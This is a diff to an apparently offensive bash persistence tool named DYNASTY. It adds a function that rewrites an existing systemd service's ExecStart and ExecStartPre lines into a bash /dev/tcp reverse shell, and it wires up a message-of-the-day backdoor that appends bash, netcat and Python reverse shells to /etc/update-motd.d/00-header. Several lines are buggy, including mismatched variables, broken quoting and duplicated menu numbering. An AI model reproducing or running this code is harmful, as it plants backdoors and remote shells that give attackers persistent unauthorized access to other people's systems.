@@ -79,7 +79,20 @@ WantedBy=default.target"
     systemctl enable rshell.service 
     systemctl start rshell.service 
 
-    echo -e "\033[0;32m[+] - Systemd Root level setup successfully!"
+    echo -e "\033[0;32m[+] - Systemd Root Level Service successfully configued!"
+}
+
+ModServiceOnSystemd() {
+    echo -e "\033[0;32m[+] - Modify Systemd Service for Persistence"
+    read -p "Enter the location of the service: " loca
+    sed -i "/^ExecStart=/c\ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" "$loca"
+    if grep -q "ExecStartPre" "$service_file"; then
+        sed -i "s/^ExecStartPre=.*/ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" "$loca"
+        echo "ExecStartPre present! ExecStartPre was modified!\n\n"
+    else
+        echo "No ExecStartPre present! ExecStart was modified!\n\n"
+    fi
+    echo -e "\033[0;32m[+] - Modified Root level setup successfully!"
 }
 
 cronjobs() {
@@ -142,11 +155,12 @@ rcePersistence() {
 }
 
 MessageOfTheDay() {
+    echo -e "\033[0;32m[+] - Linux header / Message Of The Day Persistence"
     read -p "Enter your python location? " pythonv
     echo "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'" >> /etc/update-motd.d/00-header 
     echo "nc -e /bin/sh $ip $port" >> /etc/update-motd.d/00-header 
     echo "$pythonv -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ip",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'' >> /etc/update-motd.d/00-header"
-    
+    echo -e "\033[0;32m[+] - Success!"
 }
 
 help() {
@@ -179,6 +193,12 @@ help() {
         \e[93m7. LD_PRELOAD Privilege Escalation:\e[0m
         Special Thanks to @MatheuzSec for this.
 
+        \e[93m7. Backdooring Message Of The Day / Linux Header:\e[0m
+        Backdoor the Linux header on 00-header on the update-motd framework
+
+        \e[93m7 Modify A Systemd Service for Persistence:\e[0m
+        Modify a present systemd service for a reverse shell / persistence 
+
         ───────────────────DYNASTY───────────────────\e[0m"
 
 
@@ -205,6 +225,7 @@ main() {
        3. Custom User with Root       6. Bashrc Persistence 
        7. Systemd Service for Root    8. LD_PRELOAD Privilege Escalaion Config
        9. Backdooring Message of the Day / Header 
+       10. Modify An Existing Systemd Service 
        
        help for more information! 
        "
@@ -223,6 +244,10 @@ main() {
            bashrc 
        elif [ "$input" == "8" ]; then
            LDPreloadPrivesc 
+       elif [ "$input" == "9" ]; then
+           MessageOfTheDay
+       elif  [ "$input" == "10" ]; then
+           ModServiceOnSystemd 
        elif [ "$input" == "help" ] || [ input == "h" ]; then
            help 
        else 
